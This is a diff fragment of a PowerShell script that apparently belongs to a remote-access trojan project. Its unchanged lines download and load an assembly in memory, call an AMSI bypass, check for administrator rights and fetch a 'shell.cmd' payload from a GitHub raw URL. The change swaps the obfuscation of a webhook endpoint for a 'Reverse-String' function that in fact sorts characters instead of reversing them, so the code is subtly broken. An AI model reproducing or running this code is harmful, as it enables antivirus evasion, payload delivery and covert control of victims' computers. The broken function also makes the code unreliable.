@@ -56,21 +56,18 @@ $bytes = (New-Object Net.WebClient).DownloadData($url)
 $assembly = [System.Reflection.Assembly]::Load($bytes)
 [Bypass]::amsi()
 
-function Obfuscate-String {
+function Reverse-String {
     param (
         [string]$inputString
     )
-
-    $output = -join ($inputString.ToCharArray() | ForEach-Object {
-        $charCode = [int][char]$_
-        $obfuscatedCharCode = (($charCode - 1000) % 256)
-        [char]$obfuscatedCharCode
-    })
     
-    return $output
+    # Đảo ngược chuỗi
+    $reversedString = -join ($inputString.ToCharArray() | Sort-Object -Descending)
+    
+    return $reversedString
 }
 
-$webhook = Obfuscate-String -inputString $webhook
+$webhook = Reverse-String $webhook
 
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     Invoke-WebRequest "https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/shell/shell" -OutFile "$env:TEMP\shell.cmd"
